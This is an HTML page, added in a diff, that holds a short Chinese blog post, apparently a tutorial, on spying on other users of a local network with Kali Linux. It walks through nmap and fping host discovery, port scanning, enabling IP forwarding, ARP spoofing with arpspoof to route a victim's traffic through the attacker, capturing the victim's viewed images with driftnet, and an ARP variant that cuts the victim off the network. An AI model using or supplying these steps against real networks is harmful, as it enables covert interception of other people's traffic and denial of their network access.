@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali linux查看局域网内其他用户的输入信息</title>
+    <style type="text/css" media="all">
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #777;
+        background-color: white;
+      }
+      .container {
+        width: 700px;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .post {
+        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
+        position: relative;
+        padding: 70px;
+        bottom: 0;
+        overflow-y: auto;
+        font-size: 16px;
+        font-weight: normal;
+        line-height: 25px;
+        color: #515151;
+      }
+
+      .post h1{
+        font-size: 50px;
+        font-weight: 500;
+        line-height: 60px;
+        margin-bottom: 40px;
+        color: inherit;
+      }
+
+      .post p {
+        margin: 0 0 35px 0;
+      }
+
+      .post img {
+        border: 1px solid #D9D9D9;
+      }
+
+      .post a {
+        color: #28A1C5;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="post">
+        <h1 class="title">Kali linux查看局域网内其他用户的输入信息</h1>
+        <div class="show-content">
+          <p>1:使用nmap工具在局域网里进行侦探，查看局域网里ip存活数量</p><p>root@kali:~# nmap -sP 192.168.1.0/24</p><p><br></p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/14555448-14a1d8f201adf699.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="" style="" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>2：扫描端口：</p><p>nmap 192.168.1.158  我的台式机</p><p><br></p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/14555448-525fc7a7279d7dcf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>3.：工具：ArpSpoof</p><p>命令：</p><p>   ARP欺骗：目标的IP流量经过攻击机网卡，从网关出去</p><p>       1、echo 1 &gt;/proc/sys/net/ipv4/ip_forward（进行IP流量转发）</p><p>        2、arpspoof -i （网卡） -t  （目标网关 目标IP）</p><p>      （3、driftnet -i eth0 【获取流量浏览图片】）</p><p>    ARP断网命令：目标的IP流量经过攻击机网卡，不从网关出去</p><p>    arpspoof -i （网卡） -t  （目标网关 目标IP）</p><p>    网卡：kali虚拟机 = eth0 （ifconfig命令查询）</p><p>    目标IP： win10物理机 = 169.254.xxx.xxx（cmd --&gt; ipconfig）</p><p>    网关：win10 = 192.168.1.1</p><p>注：局域网IP查询（多种方式查看ip）</p><p>        fping -asg 192.168.1.0（局域网前三段加0）/24</p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
